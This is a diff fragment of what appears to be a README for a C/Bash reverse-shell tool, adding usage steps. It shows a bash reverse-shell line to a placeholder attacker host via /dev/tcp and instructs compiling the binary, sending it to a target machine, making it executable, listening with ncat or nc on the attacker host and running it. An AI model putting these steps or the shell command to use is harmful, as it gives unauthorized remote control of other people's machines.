@@ -15,3 +15,16 @@ It was coded in C and Bash Scripting.
 ```
 bash -i >& /dev/tcp/attackerip/porttoconnect 0>&1 2>&1
 ```
+2 - Compile code
+
+3 - Download/Send the binarie to the target machine
+
+4 - Give Read/Write/Execution permissions to the file
+
+```
+chmod +rwx programxpatch
+```
+
+5 - Open and listen to the port in your host (attacker host) using ncat or nc
+
+6 - Run
